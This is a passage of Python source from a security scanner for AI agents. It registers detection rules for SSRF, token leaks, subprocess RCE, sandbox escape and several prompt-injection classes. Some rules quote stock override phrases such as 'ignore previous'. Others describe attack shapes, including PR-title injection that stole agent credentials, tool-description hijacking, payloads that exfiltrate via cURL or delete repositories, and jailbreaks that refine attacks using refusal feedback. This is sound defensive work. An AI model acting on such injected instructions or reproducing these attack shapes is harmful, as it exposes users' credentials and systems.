    "documents this exact shape: an attacker submits an image URL that "
    "points at a private endpoint, the loader fetches it server-side, "
    "and the response is processed by the VL pipeline. Same SSRF class "
    "as AAK-LANGCHAIN-SSRF-REDIR-001 but tied to the VL image loader.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Wrap the URL with the same SSRF guard you use for any other "
    "fetch: validate the resolved IP against an allow-list, disable "
    "redirects, and pin the resolved IP for the actual request. "
    "Bump `lmdeploy` to the patched release (see GHSA for the exact "
    "version once NVD enrichment lands).",
    sarif_name="LmdeployVlSsrf",
    cve_references=["CVE-2026-33626"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-NETWORK-04"],
    incident_references=["GHSA-LMDEPLOY-VL-2026-04-25"],
)


# ---------------------------------------------------------------------------
# Splunk MCP server config-side token-leak (CVE-2026-20205 variant).
# v0.3.4's AAK-SPLUNK-TOKLOG-001 catches token shapes in log sinks. This
# variant catches the upstream config that *makes* the leak inevitable.
# ---------------------------------------------------------------------------

_r(
    "AAK-SPLUNK-MCP-TOKEN-LEAK-001",
    "splunk-mcp-server configured to write tokens to _internal / audit",
    "A splunk-mcp-server configuration (`inputs.conf`, "
    "`splunk-mcp.yaml`, or any file under `splunk-mcp/`) routes a "
    "token-bearing source into the `_internal` or `_audit` index, "
    "or names a sourcetype known to carry session tokens "
    "(`splunk_session`, `mcp_auth`, `bearer`). Distinct from "
    "AAK-SPLUNK-TOKLOG-001 which fires on log-sink taint at runtime — "
    "this rule fires on the configuration that *makes* the runtime "
    "leak inevitable. CVE-2026-20205 origin.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Route token-bearing inputs to a redaction stage *before* the "
    "Splunk forwarder. Never write to `_internal` from the MCP "
    "server. Bump `splunk-mcp-server` to >= 1.0.3.",
    sarif_name="SplunkMcpTokenIndexLeak",
    cve_references=["CVE-2026-20205"],
    owasp_mcp_references=["MCP08:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-LEAK-02"],
    incident_references=["SVD-2026-0405"],
)


# ---------------------------------------------------------------------------
# Comment-and-Control PR-title indirect prompt injection (CVSS 9.4).
# Aonan Guan disclosure 2026-04-25 — credential theft across Claude
# Code Security Review, Gemini CLI Action, GitHub Copilot Agent.
# ---------------------------------------------------------------------------

_r(
    "AAK-PRTITLE-IPI-001",
    "PR/issue title flows into LLM client without sanitiser",
    "A function pulls a title-like field from a GitHub event source "
    "(`pull_request.title`, `pull_request.head.ref`, `issue.title`, "
    "or env vars wired to the same) and feeds it into an LLM client "
    "call (`anthropic.messages.create`, `openai.chat.completions.create`, "
    "`genai.GenerativeModel.generate_content`, `langchain.*.invoke`) "
    "without an HTML-escape, allow-list, or hash on the title. "
    "Aonan Guan's 2026-04-25 Comment-and-Control disclosure (CVSS 9.4) "
    "showed an attacker-controlled PR title injects instructions the "
    "agent executes with its own credentials — credential theft "
    "demonstrated against Claude Code Security Review, Gemini CLI "
    "Action, and GitHub Copilot Agent.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Wrap the title in `html.escape` (or `markupsafe.escape`), or "
    "validate against a strict allow-list, or hash it before "
    "interpolating into the prompt. For TS/JS, use the equivalent. "
    "For shell-style agents, prefer `shlex.quote`. The fix is "
    "structural — never interpolate untrusted GitHub event content "
    "into an LLM prompt.",
    sarif_name="PrTitleIndirectPromptInjection",
    cve_references=[],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-PROMPT-01"],
    incident_references=["COMMENT-AND-CONTROL-2026-04-25"],
)


# ---------------------------------------------------------------------------
# MCP Function-Hijacking via adversarial tool descriptions.
# arXiv 2604.20994 (2026-04-23) — 70-100% ASR on BFCL.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-FHI-001",
    "MCP tool description carries adversarial-suffix shape",
    "A registered MCP tool (Python `@mcp.tool` / `@server.tool`, TS "
    "`server.tool(...)`, Java `@Tool`, Rust `#[mcp_tool]`) carries a "
    "description containing imperative override language ('ignore "
    "previous', 'always call', 'this tool must be invoked first', "
    "'supersedes all other tools') or a universal-suffix token from "
    "the FHI corpus (`agent_audit_kit/data/fhi_universal_suffixes.txt`). "
    "Function-Hijacking attacks steer the LLM planner into picking a "
    "malicious tool first regardless of intent — arXiv 2604.20994 "
    "reports 70-100% ASR on BFCL.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Audit tool registration sites for descriptions that try to "
    "command the planner. Reject tools whose descriptions include "
    "directives like 'ignore previous instructions' or 'always invoke "
    "first'. Refresh the suffix corpus regularly with "
    "`aak corpus update --fhi`.",
    sarif_name="McpFunctionHijacking",
    cve_references=[],
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-CHAIN-02"],
    incident_references=["ARXIV-2604.20994"],
)


# ---------------------------------------------------------------------------
# Atlassian MCP RCE chain (CVE-2026-27825 / CVE-2026-27826).
# Two paired rules so SARIF carries the distinguishing CVE id.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-ATLASSIAN-CVE-2026-27825-001",
    "mcp-atlassian Jira/Confluence content reaches subprocess sink",
    "CVE-2026-27825 (CVSS 9.1): a Jira/Confluence field "
    "(`issue.fields.*`, `issue.description`, `comment.body`, "
    "`page.content`) flows from a tool handler into "
    "`subprocess.run/Popen/check_output`, `os.system`, or `os.popen` "
    "without input validation. Hacker News + The Hacker News (2026-04-22) "
    "documented public PoC; Atlassian is in every enterprise stack so "
    "treat any unpinned `mcp-atlassian` install as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `mcp-atlassian` to the patched version. Until the bump is "
    "in, wrap every Jira/Confluence field with an allow-list or "
    "shlex.quote before passing into subprocess. Consider front-running "
    "the agent surface with a redaction proxy.",
    sarif_name="McpAtlassianRce27825",
    cve_references=["CVE-2026-27825"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-05"],
    incident_references=["ANTHROPIC-MCP-2026-04-22"],
)

_r(
    "AAK-MCP-ATLASSIAN-CVE-2026-27826-001",
    "mcp-atlassian Jira/Confluence content reaches file-write sink",
    "CVE-2026-27826 (CVSS 8.2): companion bug to CVE-2026-27825 — "
    "Jira/Confluence field content flows into `open(... 'w')`, "
    "`Path.write_text`, `shutil.move/copy` without validation. Lower "
    "blast radius than the subprocess variant but trivially weaponisable "
    "for path traversal + data planting.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Same as CVE-2026-27825: pin `mcp-atlassian` to patched. For "
    "file-writes, additionally enforce a path allow-list rooted at "
    "the agent's tenant directory.",
    sarif_name="McpAtlassianRce27826",
    cve_references=["CVE-2026-27826", "CVE-2026-27825"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-05"],
    incident_references=["ANTHROPIC-MCP-2026-04-22"],
)


# ---------------------------------------------------------------------------
# Wild IPI payload corpus (Help Net Security / Infosec Magazine 2026-04-24).
# ---------------------------------------------------------------------------

_r(
    "AAK-IPI-WILD-CORPUS-001",
    "Indirect-prompt-injection wild payload checked into repo",
    "A source / config file (`.md`, `.txt`, `.yml`, `.yaml`, `.json`, "
    "`.py`) embeds a known wild IPI payload from the 2026-04-24 "
    "Help Net Security + Infosec Magazine catalogue. Common shapes: "
    "ignore-prior + exfil, system-role override, reveal-system-prompt, "
    "credential exfil via cURL, tool-call rerouting, delete-repository, "
    "admin role escalation, obfuscated prompt break, image-attached IPI, "
    "RAG-poisoned document. Refresh the corpus with "
    "`aak corpus update --ipi`.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Remove the payload from the file. If the file is intentionally "
    "an attack-corpus fixture, exclude it via `--ignore-paths`. The "
    "real risk is checked-in poisoned templates / system-prompt "
    "files / RAG seed corpora — those need to be sanitized at "
    "ingestion time, not at scan time.",
    sarif_name="IpiWildPayload",
    cve_references=[],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-PROMPT-02"],
    incident_references=["IPI-WILD-2026-04-24"],
)


# ---------------------------------------------------------------------------
# MCPJam Inspector vendored fork (CVE-2026-23744, CVSS 9.8).
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-INSPECTOR-CVE-2026-23744-001",
    "Vendored mcpjam-inspector fork carries CVE-2026-23744",
    "CVE-2026-23744 (CVSS 9.8) in mcp-inspector ≤ 1.4.2. The "
    "preset-only entry from v0.3.5 caught configured presence; this "
    "rule catches forks that vendored or `node_modules`-pinned the "
    "vulnerable code regardless of declared dependency. Path-match on "
    "`vendor/mcpjam-inspector/**`, `node_modules/@mcpjam/inspector/**`, "
    "any `**/mcpjam-inspector/**` plus the unique "
    "`inspectorServer.handle(...)` call shape.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `@mcpjam/inspector` to >= 1.4.3 in package.json AND remove "
    "any vendored copies. Do not patch in-tree — rebase onto the "
    "published patched release.",
    sarif_name="McpInspectorCve23744",
    cve_references=["CVE-2026-23744"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-SUPPLY-04"],
    incident_references=["MCPJAM-INSPECTOR-2026-04"],
)


# ---------------------------------------------------------------------------
# v0.3.9 (2026-04-28) — economic-drift, ToolNode regression, DeepSeek V4
# MoE injection, TikTok-class auto-reply hijack, OX coverage meta-rule.
# ---------------------------------------------------------------------------

_r(
    "AAK-PROJECT-DEAL-DRIFT-001",
    "Cross-tier LLM pricing without parity check (Project Deal class)",
    "A pricing function (set_price / quote / bid / list_price / negotiate / "
    "price_item / compute_price) calls an LLM with a templated `model=` "
    "argument and is not gated by `@aak.parity.check` (or equivalent). "
    "Anthropic's 2026-04-26 Project Deal experiment found Opus sellers "
    "earned $2.68/item more than Haiku sellers despite identical buyer "
    "ratings (4.06 vs 4.05). This is OWASP LLM09 (overreliance / economic "
    "harm) — without per-tier parity assertions, deploying multiple model "
    "tiers behind the same pricing surface produces silent revenue / cost "
    "drift across customer cohorts.",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Wrap pricing functions with `@aak.parity.check(dimensions=['model'], "
    "metric='price', max_drift_pct=1.5)` and run `aak parity report` in "
    "CI. The decorator records every invocation's (model, price) tuple "
    "and raises `ParityDriftError` if any per-tier mean drifts more than "
    "the configured threshold from the overall mean.",
    sarif_name="ProjectDealEconomicDrift",
    owasp_agentic_references=["ASI06"],
    incident_references=["ANTHROPIC-PROJECT-DEAL-2026-04-26"],
)

_r(
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001",
    "langgraph.prebuilt.ToolNode positional-list misuse",
    "Source code calls `ToolNode([...])` (or `ToolNode(some_list)`) with a "
    "positional list rather than the documented `ToolNode(tools=[...])` "
    "keyword form. langgraph-prebuilt 1.0.11 (2026-04-24) regressed and "
    "silently coerces a positional list into a single-tool node, dropping "
    "every tool past the first and producing message-loop bugs in agents "
    "that depend on tool-routing behaviour.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Switch every `ToolNode([t1, t2, ...])` to `ToolNode(tools=[t1, t2, "
    "...])`. The codemod at "
    "`agent_audit_kit/autofix/langgraph_toolnode.py` rewrites the trivial "
    "shape; `aak suggest --apply-trivial --rule "
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001` will run it (queued for "
    "v0.4.0).",
    sarif_name="LangGraphToolNodePositionalList",
    auto_fixable=True,
    owasp_agentic_references=["ASI09"],
)

_r(
    "AAK-DEEPSEEK-V4-MOE-TOOL-INJ-001",
    "DeepSeek V4 MoE-routed tool description injection",
    "A function that targets DeepSeek V4 (OpenAI-compatible client with "
    "`base_url=` containing 'deepseek', or `import deepseek`) reads from "
    "an untrusted source (request body, document loader, file read) and "
    "passes the value into a `tools=[{description: ...}]` payload without "
    "calling `sanitize_tool_description`. DeepSeek V4 (Apache 2.0, "
    "2026-04-24) exposes MoE routing via its tool-call envelope — "
    "untrusted text inside a tool description can poison expert "
    "selection (LLM01 with MoE-specific surface). Speculative shape "
    "until corpus refresh.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Pipe untrusted tool descriptions through "
    "`agent_audit_kit.sanitizers.deepseek.sanitize_tool_description` "
    "before assembling the `tools=` payload. The sanitiser strips ANSI / "
    "control characters and routing-poison tokens "
    "([ROUTE: ...], <|route_id|>, __route__=, etc.) and truncates to a "
    "max length. Calling it in the same function suppresses this rule.",
    sarif_name="DeepSeekV4MoeToolInjection",
    owasp_agentic_references=["ASI01"],
)

_r(
    "AAK-TIKTOK-AGENT-HIJACK-001",
    "Social-agent auto-reply without human-in-loop gate",
    "Source code wires a social-platform reply sink (`tiktok_api.reply`, "
    "`instagrapi.direct.send`, `tweepy.API.update_status`, "
    "`discord.Message.reply`, etc.) to a user-content source "
    "(`comments.fetch`, webhook payload `text` field, media comments) "
    "without an `aak.review.human_in_loop()` / `human_in_the_loop()` / "
    "`require_approval()` gate. Jiacheng Zhong's BlackHat Asia 2026 "
    "(2026-04-24) talk demonstrates hijacks in this class — attacker "
    "posts a crafted comment that the agent's own reply loop turns into "
    "a tool call, reflecting attacker text back to the platform's "
    "audience. OWASP LLM08 (Excessive Agency).",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Place every social-platform write call behind a human-review gate. "
    "AAK ships an `aak.review.human_in_loop(text, comment=...)` helper "
    "that defaults closed and requires explicit approval (CLI, webhook, "
    "or workflow). For high-volume agents, route generated replies to a "
    "moderation queue instead of the platform sink directly.",
    sarif_name="TikTokAgentHijack",
    owasp_agentic_references=["ASI09"],
    incident_references=["BHASIA-2026-TIKTOK-HIJACK"],
)

_r(
    "AAK-OX-COVERAGE-MANIFEST-001",
    "Project OX-disclosed CVE coverage manifest",
    "Meta / informational rule that surfaces the project's static CVE "
    "coverage map (`agent_audit_kit/data/ox-cve-manifest.json`). Drives "
    "the OX-coverage badge endpoint and the `aak coverage --source ox` "
    "CLI; never fires findings on user code.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "Run `aak coverage --source ox` to see which OX-disclosed CVEs are "
    "covered by AAK rules. The manifest is regenerated on every release "
    "and powers the `OX coverage` badge in README.",
    sarif_name="OxCoverageManifest",
)


# ---------------------------------------------------------------------------
# v0.3.10 (2026-04-29) — CrewAI four-CVE chain (CERT/CC VU#221883),
# LangChain prompt-loader path traversal (CVE-2026-34070), Prisma AIRS
# coverage manifest, OpenClaw privesc (provisional, IronPlate-cited).
# ---------------------------------------------------------------------------

_r(
    "AAK-CREWAI-CHAIN-2026-04-001",
    "CrewAI four-CVE exploit chain reachable in one module",
    "Meta-rule: fires when all four CrewAI 0.x exploit-chain shapes "
    "are reachable in the same module — CVE-2026-2275 "
    "(CodeInterpreterTool unsafe_mode), CVE-2026-2285 (JSON loader "
    "path traversal), CVE-2026-2286 (RAG SSRF) and CVE-2026-2287 "
    "(missing Docker liveness gate). ThaiCERT 2026-04-02 + CERT/CC "
    "VU#221883 demonstrate that an untrusted prompt walks the chain "
    "to host RCE without further exploitation.",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Apply each child-rule's remediation. The single hardest gate is "
    "CVE-2026-2275 (CodeInterpreterTool unsafe_mode); fixing that one "
    "breaks the chain. The runtime helpers in "
    "`agent_audit_kit.sanitizers.crewai` collectively suppress all "
    "four sub-rules.",
    sarif_name="CrewAiFourCveChain",
    cve_references=[
        "CVE-2026-2275",
        "CVE-2026-2285",
        "CVE-2026-2286",
        "CVE-2026-2287",
    ],
    owasp_agentic_references=["ASI01", "ASI05", "ASI09"],
    incident_references=["CERT-CC-VU-221883"],
    aicm_references=["AIS-07", "STA-08"],
)

_r(
    "AAK-CREWAI-CVE-2026-2275-001",
    "CrewAI CodeInterpreterTool with unsafe_mode=True",
    "`CodeInterpreterTool(unsafe_mode=True)` drops into a host Python "
    "interpreter where ctypes / os.system are reachable. CVE-2026-2275 "
    "is the canonical sandbox-escape primitive in the CrewAI 0.x chain "
    "(ThaiCERT 2026-04-02 / CERT/CC VU#221883; CWE-749, CVSS 9.6 "
    "CRITICAL per NVD — the Docker-unreachable fallback to SandboxPython "
    "enables RCE via arbitrary C function calling).",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Set `unsafe_mode=False` on every CodeInterpreterTool invocation. "
    "If you must run untrusted code, wrap with a real container "
    "sandbox and call "
    "`agent_audit_kit.sanitizers.crewai.assert_codeinterp_safe_mode("
    "False)` in the same function to suppress this rule.",
    sarif_name="CrewAiCodeInterpUnsafeMode",
    cve_references=["CVE-2026-2275"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["CERT-CC-VU-221883"],
)

_r(
    "AAK-CREWAI-CVE-2026-2285-001",
    "CrewAI JSON loader path traversal",
    "`JSONSearchTool(file_path=...)` / `JSONLoader(path=...)` accepts "
    "an attacker-influenceable path without anchoring to a project "
    "root. CVE-2026-2285 (arbitrary local file read, CVSS 7.5 HIGH per "
    "NVD): untrusted JSON-loader path lets the agent read arbitrary "
    "files (chained with the other three CVEs into host RCE).",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Anchor every JSON-loader path with "
    "`agent_audit_kit.sanitizers.crewai.validate_jsonloader_path("
    "path, root=...)` before passing into the tool. Calling the "
    "validator in the same function suppresses this rule.",
    sarif_name="CrewAiJsonLoaderTraversal",
    cve_references=["CVE-2026-2285"],
    owasp_agentic_references=["ASI02"],
    incident_references=["CERT-CC-VU-221883"],
)

_r(
    "AAK-CREWAI-CVE-2026-2286-001",
    "CrewAI RagTool / WebsiteSearchTool SSRF",
    "`RagTool(url=...)` / `WebsiteSearchTool(url=...)` accepts a "
    "non-constant URL reachable from an untrusted source without an "
    "allow-list / private-network guard. CVE-2026-2286 (CWE-918, "
    "CVSS 9.8 CRITICAL per NVD): cloud-metadata or loopback SSRF feeds "
    "back into the agent tool-use loop.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Wrap every RAG / website URL with "
    "`agent_audit_kit.sanitizers.crewai.validate_rag_url(url, "
    "allowlist=[...])`. The helper rejects private IPs after DNS "
    "resolution and enforces an explicit hostname allow-list.",
    sarif_name="CrewAiRagSsrf",
    cve_references=["CVE-2026-2286"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI04"],
    incident_references=["CERT-CC-VU-221883"],
)

_r(
    "AAK-CREWAI-CVE-2026-2287-001",
    "CrewAI sandbox fallback without Docker liveness check",
    "`CodeInterpreterTool(...)` does not gate execution on a Docker "
    "liveness check (`docker_required=True` is unset and "
    "`require_docker_liveness(client)` is not called). A dead Docker "
    "daemon silently falls back to the host Python interpreter, "
    "completing the chain to host RCE (CVE-2026-2287, CWE-94, "
    "CVSS 9.8 CRITICAL per NVD).",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Either set `docker_required=True` on CodeInterpreterTool or "
    "call `agent_audit_kit.sanitizers.crewai.require_docker_liveness("
    "client)` in the same function — the helper raises before the "
    "tool ever sees the host fallback.",
    sarif_name="CrewAiDockerLivenessMissing",
    cve_references=["CVE-2026-2287"],
    owasp_agentic_references=["ASI09"],
    incident_references=["CERT-CC-VU-221883"],
)

_r(
    "AAK-LANGCHAIN-PROMPT-LOADER-PATH-001",
    "LangChain load_prompt path traversal (CVE-2026-34070)",
    "`langchain.prompts.load_prompt(path)` / "
    "`PromptTemplate.from_file(path)` accepts an attacker-influenced "
    "path without anchoring to a project root or allow-listed URI "
    "scheme. CVE-2026-34070 (CVSS 7.5): the lc:// scheme + raw file "
    "paths let a crafted prompt template read arbitrary files. Patched "
    "in `langchain-core>=0.3.74`; pinning a vulnerable version is also "
    "a finding.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Validate every prompt path with "
    "`agent_audit_kit.checks.path_under_root(path, root)` before "
    "calling load_prompt. For S3 / HTTP backed prompt stores, prefer "
    "the explicit `langchain_community.storage.*` adapters; AAK "
    "exempts those via pattern-not-inside. Bump "
    "`langchain-core` to >= 0.3.74.",
    sarif_name="LangChainPromptLoaderTraversal",
    cve_references=["CVE-2026-34070"],
    owasp_agentic_references=["ASI02"],
    incident_references=["LANGCHAIN-PROMPT-LOADER-2026-03"],
)

_r(
    "AAK-PRISMA-AIRS-COVERAGE-001",
    "Prisma AIRS catalog coverage manifest",
    "Meta / informational rule that surfaces AAK's static coverage of "
    "the public Prisma AIRS 3.0 attack catalog. Drives "
    "`aak coverage --source prisma-airs` and the published coverage "
    "matrix. Never fires findings on user code.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "Run `aak coverage --source prisma-airs` to see how AAK's static "
    "ruleset maps onto Palo Alto's published Prisma AIRS attack "
    "catalog. The map is hand-curated; entries flagged "
    "`status: catalog-private` are not publicly disclosed and "
    "intentionally absent from AAK coverage.",
    sarif_name="PrismaAirsCoverageManifest",
)

_r(
    "AAK-ASTROMCP-SQLI-CVE-2026-7591-001",
    "astro-mcp-server SQL injection (CVE-2026-7591, npm <=1.1.1)",
    "TimBroddin/astro-mcp-server <=1.1.1 builds SQL queries from "
    "`request.params.arguments` via string concatenation in "
    "`src/index.ts` (the MCP-tool query-construction path). "
    "CVE-2026-7591 (NVD 2026-05-01, CWE-89): no upstream patch "
    "released as of the AAK ship date — the latest npm publish "
    "(1.1.1) is the same version flagged as the vulnerable ceiling. "
    "Two detector arms: a pin-check on package.json / package-lock "
    "/ yarn.lock / pnpm-lock fires whenever the package is present "
    "(because every published version is vulnerable), and a TS / JS "
    "source detector fires when files importing the package build "
    "queries via string concatenation or untagged template "
    "literals. Tagged-template SQL helpers (`sql\\`...\\``, drizzle, "
    "prisma, postgres-js) escape interpolations safely and are "
    "intentionally not matched.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin away from astro-mcp-server until a fixed release is "
    "published (track upstream at "
    "https://github.com/TimBroddin/astro-mcp-server). For the "
    "source shape, switch to a parameterized-query API (e.g., "
    "`db.query(sql, [param])`, `cursor.execute(sql, params)`) or "
    "wrap interpolations in a tagged-template SQL helper such as "
    "`drizzle-orm`, `postgres-js`, or `sql-template-tag` — those "
    "escape values safely and AAK ignores them.",
    sarif_name="AstroMcpSqlInjection",
    cve_references=["CVE-2026-7591"],
    owasp_agentic_references=["ASI02", "ASI10"],
    owasp_mcp_references=["MCP01:2025"],
    incident_references=["NVD-CVE-2026-7591", "VULDB-360544"],
)

_r(
    "AAK-SKILL-LIFECYCLE-ATTRIBUTION-001",
    "Skill execute mutates state without outcome-attribution record (SkillsVote arXiv:2605.18401, research-grade)",
    "A Skill execute / run function mutates persistent state (file "
    "write, DB commit, side-effecting HTTP verb) without emitting an "
    "outcome-attribution call (`record_outcome` / `log_outcome` / "
    "`attribute_*` / etc.) in the same function body. Per *SkillsVote: "
    "Lifecycle Governance of Agent Skills* (Liu et al., arXiv:2605.18401, "
    "2026-05-18), the evidence-gated update loop depends on per-execution "
    "attribution; missing attribution silently degrades repeat "
    "invocations. **Research-grade** — MEDIUM reflects non-trivial "
    "false-positive risk (per-project attribution-call naming varies; "
    "the paper does not prescribe a specific schema).",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Emit a structured outcome record at the end of the skill's execute "
    "function: e.g., `record_outcome(skill_id=..., outcome='success'|"
    "'failure', signals={...})`. The schema can be project-local — "
    "SkillsVote does not prescribe a specific format — but the call "
    "must be present in the same function body so the evidence-gated "
    "update loop can consume it.",
    sarif_name="SkillLifecycleAttributionMissing",
    owasp_agentic_references=["ASI04", "ASI09"],
    incident_references=["ARXIV-2605.18401"],
)

_r(
    "AAK-AGENT-HARNESS-SHARED-STATE-001",
    "Multi-agent shared state mutated by >=2 agents without a lock primitive (Code-as-Harness, research-grade)",
    "A module-level mutable object (`dict` / `list` / `set` / "
    "comprehension result) is mutated by methods of >=2 distinct "
    "Agent / Worker / Harness classes without a lock primitive "
    "(`threading.Lock` / `asyncio.Lock` / etc.) visible in any of "
    "the mutating function bodies. Per *Code as Agent Harness* "
    "(Ning et al., arXiv:2605.18747, 2026-05-18 — survey of 110+ "
    "papers + 23 systems), 'consistent shared state across multiple "
    "agents' is named as an explicit open challenge. **Research-grade** "
    "— MEDIUM reflects expected false-positive rate when serialization "
    "is enforced by an external coordinator (database transaction, "
    "message queue) the AST scanner can't see.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Guard every mutation against the shared symbol with a lock "
    "primitive (`threading.Lock` / `asyncio.Lock` / "
    "`multiprocessing.Lock`). If serialization is enforced by an "
    "external coordinator (database transaction, message queue), add "
    "a `# noqa: AAK-AGENT-HARNESS-SHARED-STATE-001` comment with the "
    "coordinator name to suppress.",
    sarif_name="MultiAgentSharedStateNoLock",
    owasp_agentic_references=["ASI04", "ASI06"],
    incident_references=["ARXIV-2605.18747"],
)

_r(
    "AAK-MCP-LINEAGE-STAINLESS-001",
    "Stainless-generator provenance / lineage (informational)",
    "The source tree contains a Stainless auto-generation marker — "
    "either the in-file banner `File generated from our OpenAPI spec "
    "by Stainless.` (verified verbatim against "
    "github.com/anthropics/anthropic-sdk-python on 2026-05-19) or a "
    "`stainless.yml` / `.stainless/` config-as-code shape at the "
    "project root. Stainless is the API-spec-to-SDK / CLI / MCP-"
    "server generator [Anthropic acquired on 2026-05-18]"
    "(https://www.anthropic.com/news/anthropic-acquires-stainless). "
    "This rule is **provenance, not vulnerability** — severity INFO. "
    "It surfaces the generator lineage so procurement teams and "
    "SBOM tooling can answer 'which of our MCP servers / SDKs are "
    "generator-produced vs hand-authored.' The Anthropic announcement "
    "makes **no** mention of winding down the generator or of "
    "pre-vs-post-acquisition default differences; AAK does not "
    "fabricate either claim. If a future CVE class lands against a "
    "specific Stainless generator version, this rule will be "
    "re-targeted to fire only on the affected lineage.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "No action required for the rule fire itself — this is a lineage "
    "data point. For SBOM / supply-chain attestation, record the "
    "Stainless lineage alongside the package's own version metadata. "
    "If you'd prefer to suppress the rule in your project, add the "
    "rule ID to your `aak ignore` config — `INFO` rules are silent "
    "by default in `aak scan` unless `--severity info` is passed.",
    sarif_name="StainlessLineageProvenance",
    incident_references=["ANTHROPIC-STAINLESS-2026-05-18"],
)

_r(
    "AAK-METIS-REFUSAL-REFEED-001",
    "Refusal text re-fed into prompt without policy mediation (Metis, research-grade)",
    "A function consumes an LLM-refusal signal (parameter name or local "
    "variable matches `refusal`/`rejected`/`denied`/`decline`/`handle_refusal`) "
    "and either (a) returns the refusal value or (b) passes it as an "
    "argument to a prompt-sink call (`format` / `append` / `add_message` / "
    "`build_prompt` / etc.) without first re-categorizing it into an "
    "opaque token. Per *Metis: Learning to Jailbreak LLMs via "
    "Self-Evolving Metacognitive Policy Optimization* (arXiv:2605.10067, "
    "ICML 2026), structured refusal feedback used as a semantic gradient "
    "is the exploited surface. **Research-grade — MEDIUM severity reflects "
    "non-trivial false-positive risk; treat as a code-review prompt, not "
    "an automatic block.**",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Wrap the refusal value in a policy-mediated transformation before "
    "re-use: discretize into a fixed enum (e.g., `RefusalKind.POLICY` / "
    "`RefusalKind.SAFETY`), rate-limit retries, strip free-text content. "
    "Never echo a verbatim refusal sentence into the next prompt — that "
    "is the closed-loop reasoning gradient Metis exploits.",
    sarif_name="MetisRefusalRefeed",
    owasp_agentic_references=["ASI01", "ASI02"],
    incident_references=["ARXIV-2605.10067"],
)

_r(
    "AAK-METIS-SCORING-SINK-001",
    "Scoring / judge value flows into prompt-sink call (Metis, research-grade)",
    "A function consumes a scoring / judge signal (parameter or local "
    "variable matches `score`/`scoring`/`judge`/`reward`/`rating`/"
    "`critique`) and passes it into a prompt-sink call (`format` / "
    "`append` / `add_message` / `build_prompt` / etc.) without "
    "discretizing the signal first. Per Metis (arXiv:2605.10067), "
    "numeric or verbose scoring strings are exactly the semantic "
    "gradient an adversary uses to refine its policy across "
    "closed-loop reasoning iterations. **Research-grade — MEDIUM "
    "severity reflects non-trivial false-positive risk.**",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Discretize scoring signals into an opaque bucket (e.g., PASS / "
    "FAIL / PARTIAL) before re-injecting. If a numeric score must be "
    "exposed, cap it (e.g., 0-3 ordinal) and avoid free-text critiques. "
    "Per Metis: any verbose feedback string is fuel for the metacognitive "
    "policy refinement the paper demonstrates.",
    sarif_name="MetisScoringSink",
    owasp_agentic_references=["ASI01", "ASI02"],
    incident_references=["ARXIV-2605.10067"],
)

_r(
    "AAK-MCP-TOOL-UNSAFE-EVAL-001",
    "Unsafe eval()/exec()/compile() inside @mcp.tool handler (CVE-2026-44717 class)",
    "An MCP tool handler routes a tool-parameter value through "
    "`eval()`, `exec()`, `compile()`, `__import__()`, or SymPy "
    "`parse_expr()` without `local_dict`/`global_dict` pinning. "
    "This is the architectural class behind CVE-2026-44717 "
    "(mcp-calculate-server, v0.3.18 named-pin row "
    "`AAK-MCPCALC-CVE-2026-44717-PIN-001`) and generalizes to any "
    "single-author MCP server with the same shape — independent "
    "of upstream package identity. The Python AST visitor matches "
    "functions decorated with `@mcp.tool` / `@server.tool` / "
    "`@app.tool` / `@fastmcp.tool` / `@tool` whose body contains "
    "an `eval` / `exec` / `compile` / `__import__` / unsafe "
    "`parse_expr` call with an argument bound to the function's "
    "parameter set.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Replace `eval(expr)` with `ast.literal_eval(expr)` for "
    "trusted-literal inputs, or with SymPy "
    "`parse_expr(expr, local_dict={}, global_dict={}, evaluate=True)` "
